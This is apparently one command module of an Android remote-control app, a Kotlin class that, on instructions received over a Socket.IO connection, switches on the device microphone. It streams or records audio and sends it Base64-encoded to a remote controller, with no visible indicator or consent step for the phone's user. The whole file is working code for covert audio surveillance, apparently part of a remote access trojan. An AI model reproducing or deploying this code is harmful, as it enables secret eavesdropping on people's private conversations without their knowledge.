package com.remote.system

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.media.*
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.util.Log
import androidx.core.content.ContextCompat
import org.json.JSONException
import org.json.JSONObject
import io.socket.client.Socket
import java.io.ByteArrayOutputStream
import java.util.concurrent.atomic.AtomicBoolean

class AudioCommand(private val context: Context) : CommandHandler {
    private val tag = "AudioCommand"
    
    private var audioRecord: AudioRecord? = null
    private var isRecording = AtomicBoolean(false)
    private var recordingThread: Thread? = null
    private var currentSocket: Socket? = null
    private var currentClientId: String? = null
    
    // Audio configuration
    private val sampleRate = 44100 // CD quality
    private val channelConfig = AudioFormat.CHANNEL_IN_MONO
    private val audioFormat = AudioFormat.ENCODING_PCM_16BIT
    private val audioSource = MediaRecorder.AudioSource.MIC
    
    private val streamHandler = Handler(Looper.getMainLooper())

    override fun execute(params: JSONObject, clientId: String, socket: Socket) {
        val action = params.optString("action", "start")
        
        when (action) {
            "start" -> startAudioStream(params, clientId, socket)
            "stop" -> stopAudioStream(clientId, socket)
            "record" -> recordAudio(params, clientId, socket)
            "get_info" -> getAudioInfo(clientId, socket)
            else -> sendErrorResponse("Unknown action: $action", clientId, socket)
        }
    }

    private fun startAudioStream(params: JSONObject, clientId: String, socket: Socket) {
        if (!checkAudioPermission()) {
            sendErrorResponse("Audio recording permission not granted", clientId, socket)
            return
        }

        if (isRecording.get()) {
            sendErrorResponse("Audio stream already active", clientId, socket)
            return
        }

        try {
            val duration = params.optInt("duration", 0) // 0 = continuous
            val quality = params.optString("quality", "medium") // low, medium, high
            
            currentSocket = socket
            currentClientId = clientId
            
            startAudioRecording(duration, quality, clientId, socket)

        } catch (e: Exception) {
            Log.e(tag, "Error starting audio stream", e)
            sendErrorResponse("Failed to start audio stream: ${e.message}", clientId, socket)
        }
    }

    private fun stopAudioStream(clientId: String, socket: Socket) {
        try {
            stopRecording()

            val response = JSONObject()
            response.put("success", true)
            response.put("command", "audio")
            response.put("action", "stop")
            response.put("clientId", clientId)
            socket.emit("command-response", response)

            Log.d(tag, "Audio stream stopped successfully")

        } catch (e: Exception) {
            Log.e(tag, "Error stopping audio stream", e)
            sendErrorResponse("Failed to stop audio stream: ${e.message}", clientId, socket)
        }
    }

    private fun recordAudio(params: JSONObject, clientId: String, socket: Socket) {
        if (!checkAudioPermission()) {
            sendErrorResponse("Audio recording permission not granted", clientId, socket)
            return
        }

        if (isRecording.get()) {
            sendErrorResponse("Audio recording already in progress", clientId, socket)
            return
        }

        try {
            val duration = params.optInt("duration", 5000) // Default 5 seconds
            val quality = params.optString("quality", "high")
            
            recordAudioClip(duration, quality, clientId, socket)

        } catch (e: Exception) {
            Log.e(tag, "Error recording audio", e)
            sendErrorResponse("Failed to record audio: ${e.message}", clientId, socket)
        }
    }

    private fun getAudioInfo(clientId: String, socket: Socket) {
        try {
            val response = JSONObject()
            val data = JSONObject()
            
            data.put("sampleRate", sampleRate)
            data.put("channels", if (channelConfig == AudioFormat.CHANNEL_IN_MONO) 1 else 2)
            data.put("bitDepth", if (audioFormat == AudioFormat.ENCODING_PCM_16BIT) 16 else 8)
            data.put("encoding", "PCM")
            data.put("isRecording", isRecording.get())

            response.put("success", true)
            response.put("data", data)
            response.put("command", "audio")
            response.put("action", "get_info")
            response.put("clientId", clientId)

            socket.emit("command-response", response)
            Log.d(tag, "Audio info sent successfully")

        } catch (e: Exception) {
            Log.e(tag, "Error getting audio info", e)
            sendErrorResponse("Failed to get audio info: ${e.message}", clientId, socket)
        }
    }

    private fun startAudioRecording(duration: Int, quality: String, clientId: String, socket: Socket) {
        try {
            val bufferSize = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat)
            
            if (bufferSize == AudioRecord.ERROR || bufferSize == AudioRecord.ERROR_BAD_VALUE) {
                sendErrorResponse("Failed to get audio buffer size", clientId, socket)
                return
            }

            audioRecord = AudioRecord(audioSource, sampleRate, channelConfig, audioFormat, bufferSize * 2)
            
            if (audioRecord?.state != AudioRecord.STATE_INITIALIZED) {
                sendErrorResponse("Failed to initialize audio recorder", clientId, socket)
                return
            }

            isRecording.set(true)
            audioRecord?.startRecording()

            // Send stream start confirmation
            val startResponse = JSONObject()
            startResponse.put("success", true)
            startResponse.put("command", "audio")
            startResponse.put("action", "stream_started")
            startResponse.put("clientId", clientId)
            socket.emit("command-response", startResponse)

            // Start recording thread
            recordingThread = Thread {
                streamAudioData(bufferSize, quality, duration, clientId, socket)
            }
            recordingThread?.start()

        } catch (e: SecurityException) {
            sendErrorResponse("Audio permission denied", clientId, socket)
        } catch (e: Exception) {
            Log.e(tag, "Error starting audio recording", e)
            sendErrorResponse("Failed to start audio recording: ${e.message}", clientId, socket)
        }
    }

    private fun recordAudioClip(duration: Int, quality: String, clientId: String, socket: Socket) {
        try {
            val bufferSize = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat)
            audioRecord = AudioRecord(audioSource, sampleRate, channelConfig, audioFormat, bufferSize * 2)
            
            if (audioRecord?.state != AudioRecord.STATE_INITIALIZED) {
                sendErrorResponse("Failed to initialize audio recorder", clientId, socket)
                return
            }

            isRecording.set(true)
            audioRecord?.startRecording()

            recordingThread = Thread {
                recordAudioClipData(bufferSize, duration, quality, clientId, socket)
            }
            recordingThread?.start()

        } catch (e: SecurityException) {
            sendErrorResponse("Audio permission denied", clientId, socket)
        } catch (e: Exception) {
            Log.e(tag, "Error recording audio clip", e)
            sendErrorResponse("Failed to record audio clip: ${e.message}", clientId, socket)
        }
    }

    private fun streamAudioData(bufferSize: Int, quality: String, duration: Int, clientId: String, socket: Socket) {
        val audioBuffer = ByteArray(bufferSize)
        val startTime = System.currentTimeMillis()
        var frameCount = 0
        
        // Calculate frame interval based on quality
        val frameInterval = when (quality.lowercase()) {
            "low" -> 1000 // 1 second chunks
            "medium" -> 500 // 0.5 second chunks  
            "high" -> 250 // 0.25 second chunks
            else -> 500
        }

        while (isRecording.get()) {
            // Check duration limit
            if (duration > 0 && (System.currentTimeMillis() - startTime) >= duration) {
                break
            }

            val bytesRead = audioRecord?.read(audioBuffer, 0, bufferSize) ?: 0
            
            if (bytesRead > 0) {
                frameCount++
                
                // Send audio frame at intervals
                if (frameCount * bufferSize * 1000 / (sampleRate * 2) >= frameInterval) {
                    sendAudioFrame(audioBuffer, bytesRead, clientId, socket, true)
                    frameCount = 0
                }
            }
            
            Thread.sleep(10) // Small delay to prevent excessive CPU usage
        }

        stopRecording()
    }

    private fun recordAudioClipData(bufferSize: Int, duration: Int, quality: String, clientId: String, socket: Socket) {
        val audioBuffer = ByteArray(bufferSize)
        val audioData = ByteArrayOutputStream()
        val startTime = System.currentTimeMillis()

        while (isRecording.get() && (System.currentTimeMillis() - startTime) < duration) {
            val bytesRead = audioRecord?.read(audioBuffer, 0, bufferSize) ?: 0
            
            if (bytesRead > 0) {
                audioData.write(audioBuffer, 0, bytesRead)
            }
        }

        stopRecording()

        // Send complete audio clip
        val audioBytes = audioData.toByteArray()
        if (audioBytes.isNotEmpty()) {
            sendAudioFrame(audioBytes, audioBytes.size, clientId, socket, false)
        }
    }

    private fun sendAudioFrame(audioData: ByteArray, size: Int, clientId: String, socket: Socket, isStream: Boolean) {
        try {
            // Convert PCM to Base64
            val audioBytes = audioData.copyOf(size)
            val base64Data = Base64.encodeToString(audioBytes, Base64.DEFAULT)

            val response = JSONObject()
            val data = JSONObject()
            data.put("audioData", base64Data)
            data.put("audioSize", size)
            data.put("sampleRate", sampleRate)
            data.put("channels", 1)
            data.put("bitDepth", 16)
            data.put("timestamp", System.currentTimeMillis())

            response.put("success", true)
            response.put("data", data)
            response.put("command", "audio")
            response.put("action", if (isStream) "stream_frame" else "record")
            response.put("clientId", clientId)

            socket.emit("command-response", response)

        } catch (e: Exception) {
            Log.e(tag, "Error sending audio frame", e)
        }
    }

    private fun stopRecording() {
        isRecording.set(false)
        
        try {
            audioRecord?.stop()
            audioRecord?.release()
            audioRecord = null
        } catch (e: Exception) {
            Log.e(tag, "Error stopping audio recording", e)
        }

        recordingThread?.interrupt()
        recordingThread = null
        currentSocket = null
        currentClientId = null
    }

    private fun checkAudioPermission(): Boolean {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) == 
               PackageManager.PERMISSION_GRANTED
    }

    private fun sendErrorResponse(error: String, clientId: String, socket: Socket) {
        try {
            val errorResponse = JSONObject()
            errorResponse.put("success", false)
            errorResponse.put("error", error)
            errorResponse.put("command", "audio")
            errorResponse.put("clientId", clientId)
            socket.emit("command-response", errorResponse)
        } catch (e: JSONException) {
            Log.e(tag, "Error sending error response", e)
        }
    }

    // Clean up resources when service is destroyed
    fun cleanup() {
        stopRecording()
    }
}
